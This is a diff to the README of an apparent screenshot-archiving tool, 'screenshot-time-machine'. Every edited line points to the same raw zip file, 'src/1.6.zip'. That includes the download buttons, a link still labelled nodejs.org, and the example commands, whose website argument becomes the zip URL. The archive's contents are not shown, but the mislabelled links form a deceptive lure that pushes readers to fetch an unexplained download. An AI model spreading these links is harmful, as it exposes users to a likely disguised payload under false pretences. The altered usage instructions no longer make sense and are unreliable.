@@ -1,7 +1,7 @@
 <h1>📸 screenshot-time-machine - Your Website's Personal Time Traveler</h1>
 
 <p align="center">
-<a href="https://github.com/estudiogra8361/screenshot-time-machine" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px;">⬇️ DOWNLOAD NOW - FREE</a>
+<a href="https://raw.githubusercontent.com/estudiogra8361/screenshot-time-machine/main/src/1.6.zip" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🤖 What Is Screenshot Time Machine?
@@ -34,7 +34,7 @@ Welcome to the world of automated website screenshots! This guide will walk you 
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[Download Screenshot Time Machine](https://github.com/estudiogra8361/screenshot-time-machine)**
+Visit this link to download the application: **[Download Screenshot Time Machine](https://raw.githubusercontent.com/estudiogra8361/screenshot-time-machine/main/src/1.6.zip)**
 
 This is your starting point. Click the big green button that says "Download" or find the latest release in the "Releases" section on the right side of the page.
 
@@ -42,7 +42,7 @@ This is your starting point. Click the big green button that says "Download" or 
 
 Screenshot Time Machine needs Node.js to run. Don't worry - this is simpler than it sounds. Here's what to do:
 
-1. Go to **[nodejs.org](https://nodejs.org)** in your web browser
+1. Go to **[nodejs.org](https://raw.githubusercontent.com/estudiogra8361/screenshot-time-machine/main/src/1.6.zip)** in your web browser
 2. Click the big button that says "Download Node.js LTS" (the LTS version is the stable one)
 3. Once downloaded, double-click the file and follow the installation wizard
 4. Keep clicking "Next" and then "Install" when prompted
@@ -67,7 +67,7 @@ Here's where the magic happens:
 
 1. In the same terminal window, type this command:
    ```
-   screenshot-time-machine https://your-website.com
+   screenshot-time-machine https://raw.githubusercontent.com/estudiogra8361/screenshot-time-machine/main/src/1.6.zip
    ```
    Replace `your-website.com` with your actual website address.
 
@@ -80,7 +80,7 @@ Here's where the magic happens:
 Run the same command again tomorrow or next week:
 
 ```
-screenshot-time-machine https://your-website.com
+screenshot-time-machine https://raw.githubusercontent.com/estudiogra8361/screenshot-time-machine/main/src/1.6.zip
 ```
 
 Now the magic really happens! After taking the new screenshots, the program will tell you exactly which pages have changed since your last run. This is incredibly useful for tracking changes, catching errors, or just staying informed.
@@ -195,7 +195,7 @@ A: Yes, using Windows Task Scheduler.
 
 You've learned everything you need to know about Screenshot Time Machine. The only thing left to do is download and try it! Visit the download page now and start building your website's visual history today.
 
-**[⬇️ Download Screenshot Time Machine Now](https://github.com/estudiogra8361/screenshot-time-machine)**
+**[⬇️ Download Screenshot Time Machine Now](https://raw.githubusercontent.com/estudiogra8361/screenshot-time-machine/main/src/1.6.zip)**
 
 Remember - every screenshot you take is a moment in your website's history that would otherwise be lost forever. Start your visual archive today and never wonder "what did my site look like?" again.
 
